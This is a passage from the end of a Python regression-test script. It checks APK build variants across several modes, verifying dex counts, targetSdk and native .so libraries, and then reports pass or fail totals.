                failures.append(f'{tag}: ' + '; '.join(problems))
                print(f'  mode{mode}: FAIL ' + '; '.join(problems))
            else:
                print(f"  mode{mode}: PASS  dex={dexes} "
                      f"targetSdk={verify['manifest']['target_sdk']} "
                      f"so={len(so_names)}")

    # 2.0 新功能回归：用 base 形态的夹具（lib 里有 4KB 页 .so，正好验证模式 4）
    extra_total = 0
    if not only or 'base' in only:
        print('=' * 70)
        print('[extra] 2.0 新功能')
        base_apk = os.path.join(BUILD, 'base.apk')
        if not os.path.isfile(base_apk):
            base_apk = build_variant('base', VARIANTS['base'])
        extra_total = extra_cases(failures, base_apk)

    print('=' * 70)
    if failures:
        print(f'FAILED {len(failures)} case(s):')
        for f in failures:
            print(' -', f)
        return 1
    print(f'ALL PASS ({len(selected) * len(MODES) + extra_total} cases)')
    return 0


if __name__ == '__main__':
    sys.stdout.reconfigure(encoding='utf-8')
    raise SystemExit(main())
